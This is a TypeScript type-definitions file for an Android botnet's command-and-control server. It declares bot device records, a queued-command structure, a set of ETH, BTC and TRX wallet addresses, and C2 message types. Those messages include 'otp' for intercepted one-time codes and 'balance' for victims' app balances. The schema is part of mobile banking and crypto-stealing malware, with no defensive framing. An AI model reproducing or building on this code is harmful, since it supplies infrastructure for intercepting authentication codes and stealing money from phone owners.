export interface BotInfo {
  id: string; model: string; android: string; country: string; ip: string;
  online: boolean; lastSeen: number; battery: number; charging: boolean;
  admin: boolean; version: string; sim: string; extra: string;
}
export interface Command {
  id: number; botId: string; cmd: string; args: string;
  status: 'queued' | 'sent' | 'done' | 'failed';
  result: string | null; createdAt: number;
}
export interface WalletSet { eth: string; btc: string; trx: string }
export type C2Message =
  | { type: 'hello'; botId: string; model: string; android: string; country: string; ip: string; battery: number; charging: boolean; admin: boolean; version: string; sim: string }
  | { type: 'hb'; botId: string; battery?: number; charging?: boolean }
  | { type: 'result'; botId: string; cmdId: number; ok: boolean; data: string }
  | { type: 'log'; botId: string; level: string; msg: string }
  | { type: 'otp'; botId: string; app: string; code: string }
  | { type: 'balance'; botId: string; app: string; balance: string }
  | { type: 'metrics'; botId: string; payload: string };
